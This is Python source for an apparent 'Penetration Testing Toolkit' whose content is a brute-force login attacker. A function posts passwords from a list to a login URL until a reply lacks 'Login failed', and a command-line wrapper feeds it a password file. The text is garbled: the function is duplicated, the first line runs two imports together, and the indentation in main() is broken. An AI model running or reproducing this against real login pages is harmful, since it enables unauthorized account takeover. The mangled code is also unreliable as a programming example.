import requestsimport requests
from typing import List, Optional, Tuple

def brute_force_login(url: str, username: str, password_list: List[str]) -> Optional[Tuple[str, str]]:
    """
    Perform a brute-force attack on a login page.
    
    :param url: URL of the login page.
    :param username: Username to test.
    :param password_list: List of passwords to try.
    :return: Tuple of (username, password) if successful, else None.
    """
    for password in password_list:
        data = {'username': username, 'password': password}
        response = requests.post(url, data=data)
        if "Login failed" not in response.text:
            return (username, password)
    return None
from typing import List, Optional, Tuple

def brute_force_login(url: str, username: str, password_list: List[str]) -> Optional[Tuple[str, str]]:
    """
    Perform a brute-force attack on a login page.
    
    :param url: URL of the login page.
    :param username: Username to test.
    :param password_list: List of passwords to try.
    :return: Tuple of (username, password) if successful, else None.
    """
    for password in password_list:
        data = {'username': username, 'password': password}
        response = requests.post(url, data=data)
        if "Login failed" not in response.text:
            return (username, password)
    return None
import argparse
from toolkit.brute_forcer import brute_force_login
def main():
    parser = argparse.ArgumentParser(description="Penetration Testing Toolkit")
    subparsers = parser.add_subparsers(dest="command")

    # Brute Forcer
    brute_parser = subparsers.add_parser("brute", help="Perform a brute-force attack")
    brute_parser.add_argument("url", help="Login page URL")
    brute_parser.add_argument("username", help="Username to test")
    brute_parser.add_argument("password_file", help="File containing password list")
     
    args = parser.parse_args()
  
  if args.command == "brute":
        with open(args.password_file, "r") as f:
            passwords = f.read().splitlines()
        result = brute_force_login(args.url, args.username, passwords)
        if result:
            print(f"Login successful: {result}")
        else:
            print("Login failed")
if __name__ == "__main__":
    main()

